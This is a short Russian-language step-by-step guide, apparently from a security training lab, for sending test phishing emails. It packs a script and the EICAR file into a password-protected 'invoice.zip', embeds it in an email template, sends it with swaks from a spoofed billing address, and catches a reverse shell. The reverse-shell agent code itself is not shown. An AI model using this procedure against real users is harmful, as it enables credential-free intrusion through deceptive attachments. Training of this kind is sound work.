Алгоритм отправки тестовых фишинговых писем пользователям:

1. Отредактируйте файл agent.py, указав в нём IP-адрес основной виртуальной машины.
----------------------------------------------------------------------------------

2. Создайте архив с паролем из файлов agent.py и eicar.txt c помощью команды:

7z a -tzip -p"infected" -mem=AES256 invoice.zip agent.py eicar.txt.

В примере команды ключом -p"infected" задаётся пароль infected.
----------------------------------------------------------------------------------

3. Получите содержимое архива в виде строки в кодировке base64 командой:

base64 -w0 invoice.zip
----------------------------------------------------------------------------------

4. Отредактируйте содержимое шаблона письма email.eml в текстовом редакторе (например, nano):
- в тексте письма ОБЯЗАТЕЛЬНО должен содержаться пароль в формате "пароль: infected". Если вы использовали другой пароль при создании архива, укажите его.

- в конце шаблона вместо XXX нужно скопировать строку в кодировке base64, которую вы получили на шаге 3.

- не забудьте сохранить файл после редактирования.
----------------------------------------------------------------------------------

5. Запустите в отдельном окне терминала серверную часть учебного реверс-шелла командой
sudo python3 server.py
----------------------------------------------------------------------------------

6. Отправьте подготовленное письмо командой:

swaks --server 127.0.0.1 --port 25 --from billing@finance-invoicer.net --to USERNAME@investpro.local,USERNAME@investpro.local --data @email.eml

В команде после ключа --to нужно указать список почтовых адресов, на которые вы хотите направить письмо.
----------------------------------------------------------------------------------

7. Если шаги проделаны корректно, в окне терминала с запущенной серверной частью шелла вы увидите приглашение

shell>